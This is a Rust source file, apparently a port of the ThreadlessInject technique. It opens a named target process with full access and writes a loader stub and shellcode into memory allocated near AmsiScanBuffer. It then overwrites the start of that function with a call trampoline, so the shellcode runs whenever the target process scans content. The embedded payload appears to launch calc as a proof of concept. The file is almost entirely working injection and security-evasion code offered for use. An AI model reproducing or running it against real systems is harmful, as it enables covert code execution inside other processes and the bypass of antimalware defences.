
/*
    Threatless Injection in Rust
    Original credit Goes to : https://github.com/CCob/ThreadlessInject
    @5mukx
*/

use sysinfo::System;
use winapi::ctypes::c_void;
use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::processthreadsapi::OpenProcess;

const SHELLCODE: [u8; 106] = [
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
];

static mut SHELLCODE_LOADER: [u8; 55] = [
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,
    0x48, 0xB9, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC,
    0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
    0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0,
];

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[-] {}", format!($msg, $($arg), *));
        std::process::exit(0);
    }
}

macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[+] {}", format!($msg, $($arg), *));
    }
}

fn main(){
    let args: Vec<String> = std::env::args().collect();
    let process_name = &args[1];
    let pid = find_process(process_name)
    .expect("[!] Failed to find the PID of the target process");

    unsafe{
        let h_module = LoadLibraryA("amsi.dll\0".as_ptr() as *const i8);
        if h_module.is_null(){
            error!("LoadLibrary Failed with status {}", GetLastError());
        }
        
        let address = GetProcAddress(
            h_module, 
            "AmsiScanBuffer\0".as_ptr() as *const i8
        );

        let func_addr = address as *mut c_void;
        let h_process = OpenProcess(
            0x000F0000 | 0x00100000 | 0xFFFF,
            0,
            pid
        );

        if h_process.is_null(){
            error!("OpenProcess Failed with status {}", GetLastError());
        }

        okey!("AmsiScanBuffer Address: {:?}", func_addr);

        okey!("Patching the {}", "trampoline");

        let orgin_bytes = *(func_addr as *const u64);

        SHELLCODE_LOADER[18..26].copy_from_slice(&orgin_bytes.to_ne_bytes());

        // need to write an function for an memory hole !
        let addr_role = find_memory_role(
            func_addr as usize,
            h_process,
        ).expect("Memory Role Failed with status");

        write_shellcode(h_process, addr_role);
        
        install_trampoline(
            h_process,
            addr_role,
            func_addr,
        );

        CloseHandle(h_process);
    }
   
}

fn find_process(process_name: &str) -> Result<u32, ()>{
    let mut system = System::new_all();
    system.refresh_all();

    for(pid, proc) in system.processes(){
        if proc.name() == process_name{
            return Ok(pid.as_u32());
        }
    }

    Err(())
}

fn find_memory_role(func_address: usize, h_process: *mut c_void) -> Result<*mut c_void, String> {
    let mut address = (func_address & 0xFFFFFFFFFFF70000) - 0x70000000;
    while address < func_address + 0x70000000 {
        let tmp_address = unsafe {
            VirtualAllocEx(
                h_process,
                address as *mut c_void,
                (SHELLCODE.len() + SHELLCODE_LOADER.len()) as usize,
                0x1000 | 0x2000,
                0x04,
            )
        };

        if !tmp_address.is_null() {
            okey!("Allocated at: {:?}", tmp_address);
            return Ok(tmp_address);
        }

        address += 0x10000;
    }

    Err("[!] Memory Role Not Found".to_string())
}

fn install_trampoline(h_process: *mut c_void, address: *mut c_void, function_address: *mut c_void) {
    let mut trampoline = [0xE8, 0x00, 0x00, 0x00, 0x00];
    let rva = (address as usize).wrapping_sub(function_address as usize + trampoline.len());
    let mut old_protect: DWORD = 0;
    let mut number_bytes_written: usize = 0;

    let rva_bytes = rva.to_ne_bytes();
    trampoline[1..].copy_from_slice(&rva_bytes[..4]);

    unsafe {
        VirtualProtectEx(
            h_process,
            function_address,
            trampoline.len(),
            0x04,
            &mut old_protect,
        );

        WriteProcessMemory(
            h_process,
            function_address,
            trampoline.as_ptr() as LPVOID,
            trampoline.len(),
            &mut number_bytes_written,
        );

        VirtualProtectEx(
            h_process,
            function_address,
            trampoline.len(),
            0x40,
            &mut old_protect,
        );
    }
}


fn write_shellcode(h_process: *mut c_void, address: *mut c_void) {
    unsafe {
        let mut number_of_write: usize = 0;
        WriteProcessMemory(
            h_process, 
            address, 
            SHELLCODE_LOADER.as_ptr() as LPVOID, 
            SHELLCODE_LOADER.len(), 
            &mut number_of_write,
        );

        let shellcode_address = address.add(SHELLCODE_LOADER.len());
        WriteProcessMemory( 
            h_process, 
            shellcode_address, 
            SHELLCODE.as_ptr() as LPVOID, 
            SHELLCODE.len(), 
            &mut number_of_write,
        );

        let mut old_protect: DWORD = 0;
        VirtualProtectEx(
            h_process, 
            address, 
            SHELLCODE.len(), 
            0x40, 
            &mut old_protect,
        );
    }   
}

